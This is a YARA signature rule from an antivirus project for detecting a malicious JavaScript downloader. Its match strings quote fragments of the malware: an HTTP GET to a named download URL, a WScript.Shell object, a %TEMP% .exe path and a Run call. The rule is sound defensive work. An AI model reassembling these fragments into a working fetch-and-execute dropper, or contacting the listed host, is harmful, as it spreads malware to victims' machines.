rule sig_20160330_1cc1b0eefc750176369342cc205382b3 {
  meta:
    description = "datamaliciousorder - file 20160330_1cc1b0eefc750176369342cc205382b3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e7eba575c62d2fce14bdcc06c29015a2f668504eb3ac7a3ab87aad4cf8d64f6f"

  strings:
    $s1  = "function V1(G, ZP){V2 = V2 * 1; return G - ZP;};" fullword ascii
    $s2  = "A[IF](\"GET\", \"http://ekotrade.pl/m4ujda\", false);" fullword ascii
    $s3  = "var I = function RC() {return WScript[H](\"WScript\"+\".Shell\");}(), MS = 11;" fullword ascii
    $s4  = "if (A[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function S() {return I[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"bw1eLYwoE3z3.ex\" + \"e\";};" fullword ascii
    $s6  = "function P(){return RL + \"\";};" fullword ascii
    $s7  = "function V() {return ((EN == true) && (EN == C)) ? 1 : V2;};" fullword ascii
    $s8  = "function O(J0){I[\"Run\"](J0, V2, V2);};" fullword ascii
    $s9  = "function X(){return 22;};" fullword ascii
    $s10 = "function RO(MU) {var J = (1, 2, 3, 4, 5, MU); return J;};" fullword ascii
    $s11 = "var T = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (LH);" fullword ascii
    $s13 = "function V0()" fullword ascii
    $s14 = "function TX(){return H;};" fullword ascii
    $s15 = "return V1(N0, TE);" fullword ascii
    $s16 = "var C = false;" fullword ascii
    $s17 = "C = true; " fullword ascii
    $s18 = "EN = true; " fullword ascii
    $s19 = "var EN = false;" fullword ascii
    $s20 = "var Q0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}